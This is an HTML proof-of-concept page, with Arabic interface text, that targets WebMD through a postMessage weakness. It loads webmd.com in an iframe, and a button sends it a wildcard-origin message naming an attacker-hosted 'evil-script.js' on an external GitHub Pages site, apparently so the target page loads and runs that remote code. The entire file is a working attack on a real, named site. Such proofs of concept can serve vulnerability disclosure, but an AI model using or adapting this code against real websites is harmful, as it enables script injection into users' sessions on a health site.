<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>WebMD postMessage PoC - External Trigger</title>
</head>
<body>
    <h1>اختبار ثغرة postMessage على WebMD (PoC خارجي)</h1>
    <p>افتح هذه الصفحة، ثم اضغط الزر أدناه لإرسال الرسالة إلى iframe يحمل WebMD.</p>

    <button onclick="sendExploit()">إرسال الـ Exploit الآن</button>

    <iframe id="targetFrame" 
            src="https://www.webmd.com/" 
            style="width:100%; height:600px; border:1px solid #ccc; margin-top:20px;">
    </iframe>

    <script>
    function sendExploit() {
        const iframe = document.getElementById('targetFrame');
        if (!iframe.contentWindow) {
            alert("الـ iframe لم يتحمل بعد، انتظر قليلاً ثم جرب تاني.");
            return;
        }

        iframe.contentWindow.postMessage({
            message: "surveywriter",
            source: "https://egyhaker.github.io/webmd.com-attacker/evil-script.js"
        }, "*");  // "*" عشان يسمح لأي origin (محاكاة هجوم حقيقي)

        console.log("تم إرسال الـ postMessage من خارجي!");
    }
    </script>
</body>
</html>
